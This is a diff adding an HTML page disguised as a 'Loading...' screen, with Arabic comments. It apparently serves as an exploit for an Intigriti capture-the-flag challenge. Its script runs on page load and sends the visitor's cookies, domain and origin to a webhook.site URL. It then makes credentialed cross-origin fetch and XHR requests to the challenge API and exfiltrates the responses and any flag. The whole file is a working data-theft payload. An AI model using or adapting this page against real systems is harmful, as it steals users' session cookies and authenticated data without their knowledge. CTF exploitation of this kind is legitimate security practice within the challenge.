@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Processing... Please wait.</h1>
+    <script>
+        (async function() {
+            const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
+            const MY_WEBHOOK = 'https://webhook.site/994e4a0e-2c1d-4190-85f5-dcba6e81e77a';
+            
+            // إرسال معلومات الـ cookies المتاحة
+            const sendInfo = (label, data) => {
+                const img = new Image();
+                img.src = `${MY_WEBHOOK}?${label}=` + encodeURIComponent(btoa(JSON.stringify(data)));
+            };
+
+            // جمع معلومات
+            sendInfo('cookies', {
+                all: document.cookie,
+                domain: document.domain,
+                origin: window.location.origin
+            });
+
+            // محاولة 1: Fetch مع credentials
+            try {
+                const response = await fetch(CHALLENGE_API, {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'cors',
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const text = await response.text();
+                
+                sendInfo('response', {
+                    status: response.status,
+                    headers: [...response.headers.entries()],
+                    body: text
+                });
+
+                // لو نجح، يبقى الـ flag جوه الـ body
+                if (response.ok) {
+                    sendInfo('FLAG', JSON.parse(text));
+                }
+
+            } catch (err) {
+                sendInfo('error', {
+                    message: err.message,
+                    name: err.name
+                });
+            }
+
+            // محاولة 2: XMLHttpRequest (أقدم وأحياناً بيشتغل أحسن)
+            setTimeout(() => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', CHALLENGE_API, true);
+                xhr.withCredentials = true;
+                
+                xhr.onload = function() {
+                    sendInfo('xhr_success', {
+                        status: this.status,
+                        response: this.responseText
+                    });
+                };
+                
+                xhr.onerror = function() {
+                    sendInfo('xhr_error', {
+                        status: this.status,
+                        statusText: this.statusText
+                    });
+                };
+                
+                xhr.send();
+            }, 1000);
+
+        })();
+    </script>
+</body>
+</html>
